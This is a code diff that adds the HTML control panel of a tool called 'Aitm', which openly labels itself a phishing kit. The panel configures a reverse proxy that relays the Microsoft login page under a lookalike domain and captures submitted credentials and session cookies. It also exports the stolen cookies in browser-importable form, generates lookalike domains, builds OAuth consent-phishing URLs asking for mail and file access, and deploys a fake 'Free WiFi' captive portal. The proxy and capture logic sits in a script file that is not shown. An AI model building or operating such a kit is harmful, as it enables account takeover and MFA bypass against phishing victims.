@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Aitm</title>
+  <link rel="stylesheet" href="aitm.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Aitm</h1>
+    <span class="tag">phishing kit</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+      </div>
+
+      <div class="card">
+        <h2>reverse proxy (aitm)</h2>
+        <label for="upstream">upstream — the real site to relay</label>
+        <input id="upstream" placeholder="https://login.microsoftonline.com" />
+        <label for="phishDomain">presented as</label>
+        <input id="phishDomain" placeholder="login.microsoft0nline.com" />
+        <label for="listenPort">listen port</label>
+        <input id="listenPort" type="number" value="8443" />
+        <div class="checks">
+          <label><input type="checkbox" id="harvestCreds" checked /> capture submitted credentials</label>
+          <label><input type="checkbox" id="harvestCookies" checked /> capture session cookies</label>
+        </div>
+        <div class="actions">
+          <button id="startProxy" class="btn danger">start relay</button>
+          <button id="stopProxy" class="btn">stop</button>
+        </div>
+        <button id="setupDns" class="btn ghost block">point domain at this host (hosts file)</button>
+      </div>
+
+      <div class="card">
+        <h2>lookalike domains</h2>
+        <label for="targetDomain">target domain</label>
+        <input id="targetDomain" placeholder="example.com" />
+        <button id="genLook" class="btn primary block">generate candidates</button>
+      </div>
+
+      <div class="card">
+        <h2>oauth consent</h2>
+        <label for="oauthClientId">client id (registered app)</label>
+        <input id="oauthClientId" />
+        <label for="oauthTenant">tenant</label>
+        <input id="oauthTenant" value="common" />
+        <label for="oauthScopes">scopes</label>
+        <input id="oauthScopes" value="openid profile email offline_access Mail.Read Files.ReadWrite" />
+        <button id="buildOauth" class="btn block">build consent url</button>
+      </div>
+
+      <div class="card">
+        <h2>captive portal</h2>
+        <label for="portalSsid">ssid name</label>
+        <input id="portalSsid" value="Free WiFi" />
+        <label for="portalPort">listen port</label>
+        <input id="portalPort" type="number" value="80" />
+        <button id="deployPortal" class="btn block">deploy portal</button>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>captured credentials <span id="credCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>host</th><th>ip</th><th>fields</th></tr></thead>
+          <tbody id="credBody"></tbody>
+        </table>
+        <div id="credEmpty" class="empty">nothing captured yet</div>
+      </div>
+
+      <div class="card">
+        <h2>session cookies <span id="ckCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>domain</th><th>name</th><th>value</th></tr></thead>
+          <tbody id="ckBody"></tbody>
+        </table>
+        <div id="ckEmpty" class="empty">no cookies captured</div>
+        <button id="exportCk" class="btn ghost block">export as json (browser-importable)</button>
+      </div>
+
+      <div class="card">
+        <h2>lookalikes <span id="lkCount" class="count">0</span></h2>
+        <div id="lkList" class="feed empty">none generated</div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="aitm.js"></script>
+</body>
+</html>
